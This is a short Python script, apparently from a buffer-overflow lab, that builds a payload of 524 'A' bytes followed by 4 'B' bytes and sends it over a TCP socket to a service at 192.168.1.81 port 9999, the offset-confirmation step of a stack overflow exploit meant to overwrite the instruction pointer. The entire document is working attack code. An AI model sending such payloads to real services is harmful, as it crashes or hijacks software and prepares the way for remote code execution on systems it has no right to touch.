import sys, socket
from time import sleep

buffer = "A" * 524 + "B" * 4

print("Sending Payload")
payload = buffer + '\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.81',9999))
s.send(payload.encode())
s.close()

